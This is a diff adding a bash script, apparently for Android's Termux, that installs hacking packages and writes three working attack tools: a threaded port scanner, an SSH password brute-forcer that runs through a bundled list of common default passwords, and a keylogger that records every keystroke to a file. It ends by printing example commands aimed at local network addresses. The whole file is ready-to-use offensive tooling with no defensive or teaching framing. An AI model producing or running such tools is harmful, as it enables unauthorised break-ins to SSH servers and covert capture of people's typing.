@@ -1,0 +1,61 @@
+#!/bin/bash
+# Termux Hacking Tool - No Root Required
+pkg update -y && pkg upgrade -y
+pkg install -y python nmap hydra git wget curl openssh
+pip install --user requests scapy colorama paramiko pynput
+mkdir -p ~/hack
+cd ~/hack
+
+cat > scan.py << 'EOF'
+import socket, sys
+from concurrent.futures import ThreadPoolExecutor
+def scan(p, i):
+ s=socket.socket()
+ s.settimeout(0.3)
+ try:
+  if s.connect_ex((i,p))==0: print(f"[+] {p} open")
+  s.close()
+ except: pass
+i=sys.argv[1]
+r=range(int(sys.argv[2]), int(sys.argv[3])+1)
+with ThreadPoolExecutor(max_workers=30) as e:
+ for p in r: e.submit(scan,p,i)
+EOF
+
+cat > sshb.py << 'EOF'
+import paramiko, sys, time
+h,u,w=sys.argv[1],sys.argv[2],sys.argv[3]
+for p in open(w).read().splitlines():
+ try:
+  c=paramiko.SSHClient()
+  c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+  c.connect(h, username=u, password=p, timeout=2)
+  print(f"[SUCCESS] {u}:{p}")
+  c.close(); break
+ except: pass
+EOF
+
+cat > keylog.py << 'EOF'
+from pynput import keyboard
+import logging
+logging.basicConfig(filename="log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
+def on_press(k):
+ logging.info(str(k))
+with keyboard.Listener(on_press=on_press) as l:
+ l.join()
+EOF
+
+cat > wl.txt << 'EOF'
+admin
+root
+123456
+password
+qwerty
+toor
+letmein
+EOF
+
+echo "=== READY ==="
+echo "python scan.py 192.168.1.1 1 1024"
+echo "python sshb.py 192.168.1.100 root wl.txt"
+echo "python keylog.py"
